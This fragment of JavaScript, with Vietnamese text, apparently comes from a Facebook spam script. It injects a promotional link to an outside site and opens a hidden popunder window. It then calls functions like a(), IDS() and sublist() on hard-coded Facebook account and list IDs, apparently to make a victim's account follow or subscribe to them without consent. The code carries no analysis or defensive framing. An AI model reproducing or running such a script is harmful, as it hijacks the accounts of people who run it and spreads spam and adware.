...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="http://thois2ham.bl.ee/hiep" target="_blank">VẼ CHIBI AVATAR<br>FaceBook.Com</a>';
	html += '</div>';
...
var w = window.open("https://sites.google.com/site/tranhinvantay/",'vatgia', params);
if (w)
{
document.cookie = "popunder=vatgia";
w.blur();
...
//het
a("100007593907323");IDS("100003308923297");sublist("482547128532247");sublist("482622165191410");a("100005697399371");
